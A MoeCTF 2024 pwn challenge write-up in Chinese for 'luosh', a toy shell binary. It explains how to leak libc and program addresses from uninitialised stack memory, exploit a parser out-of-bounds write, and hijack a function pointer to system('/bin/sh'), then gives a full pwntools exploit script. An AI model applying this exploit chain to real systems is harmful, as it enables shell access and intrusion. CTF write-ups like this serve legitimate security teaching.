## luosh

> luo 给他的系统写了一个 shell，可在那之后他的电脑总被别人攻击。你能帮他找出里面有哪些漏洞吗？
>
> - 本题与堆无关
> - 请不要用 ld 直接启动 (类似于 ./ld-linux-x86-64.so.2 ./pwn)
> - 无思路请:hammer:出题人​
>
> 
>
> hint 
>
> - 解析时的检查真的正确吗？
> - `luofuck`是什么？好像和上一次也没什么区别...
> - 对于无效的命令会输出怎样的报错信息？ **再次说明一下，本题预期解与堆无关，打堆会使得原本简单的问题变得很复杂**

预期难度：Hard++

毕竟是防 ak 的题，所以出得洞比较晦涩，但无新知识。预期解大致可以分为以下的 3 步：

- 首先往栈上输入时，若命令不存在会输出无效的指令，而在输入时并没有防死一定以`\x00`结尾，所以利用未初始化的内存可以 leak libc and proc
- 利用 parse 的写后判断的 oob 可以覆盖 inode，这里有一个任意写。但如果可以直接 rop 也太简单了，所以这里直接 ban 了 stack 和 libc，也就是任意写只能写在 proc 上。
- 然后这里就引入了`luofuck`，可以执行上一条命令，但是执行命令的索引`idx`却是在 bss 上。所以可以用一个任意写覆盖`idx`直接造成索引越界，可以控制执行流。考点是函数指针的劫持。这里有 3 条思路：
  - one gadget，没试过
  - 如果用 system 需要将任意写的地址设为`idx - 0x8`，在前面塞个`/bin/sh;`，因为参数使用的是上一次任意写的参数。
  - 也可以分两段来写，将任意写地址指向`idx - 0x20`，运行`echo /bin/sh [offset] > [filename]`



> 这道题看了选手的反馈，发现解法真是千奇百怪
>
> 有不少人卡在了 leak 那步，没想到可以用栈上未初始化的内存来 leak，然后就开始打堆...，于是就出现了很多很复杂的堆风水的做法。（但其实题目描述中明确表示了本题与堆无关）
>
> 因为一些不明原因，平台的环境与 docker 和本地的环境是不一样的。有人反映远程的堆上偏移和本地存在差异，导致出现本地和 docker 都能打通但远程打不通的情况。这种情况我也没有找到解决方案，给大家带来不便真的非常抱歉，给大家磕一个 orz。所以在之后上线了一个免费 hint 用来提示选手预期的 leak 方法



**exp**

```python
#! /usr/bin/env python3.8
from pwn import *
from ctools import *

context(os="linux", arch="amd64")
TMUX_TERMINAL()
# context.log_level = "debug"

elf_path = './pwn'
libc_path = './libc.so.6'

init_elf_with_libc(elf_path, libc_path)
DEBUG = lambda script = '': gdb.attach(io, gdbscript=script)

conn_context(host='127.0.0.1', port=9999, level=LOCAL, elf=elf_path)

elf = ELF(elf_path)
libc = ELF(libc_path, checksec=False)
io = conn()

def exp():
    io.sendafter(b'>', b'a' * 0x188)
    io.recvuntil(b'a' * 0x188)
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stderr_']
    success('libc.address: ' + hex(libc.address))
    
    io.sendafter(b'>', b'a' * 0x200)
    io.recvuntil(b'a' * 0x200)
    elf.address = u64(io.recv(6).ljust(8, b'\x00')) - elf.symbols['main']
    success('elf.address: ' + hex(elf.address))

    io.sendlineafter(b'>', b'touch file1')
    io.sendlineafter(b'>', b'echo ' + b'a' * 0x1f + b' > file1')

    pad = b'ls ' + b'a ' * 10
    pad += b'\x11' * 0x8 + p64(elf.address + 0x4060 - 8)[:6]
    pad += b' ' + b'\x10' * 0x10 + p64(libc.symbols['system'])[:6]
    io.sendlineafter(b'>', pad)

    pad = b'echo ' + b'/bin/sh;' + p64((0x528) // 0x18) +  b' > file1'
    pad = pad.replace(b'\x00', b'')
    io.sendlineafter(b'>', pad)
    
    # DEBUG()
    io.sendlineafter(b'>', b'luofuck')
    
    pass

try:
    exp()
    io.interactive()
finally:
    rm_core()
```

## Pwn 问卷

填写问卷后即可获得 flag。



MoeCTF 2024 Pwn 出题人：Chick、RiK、yo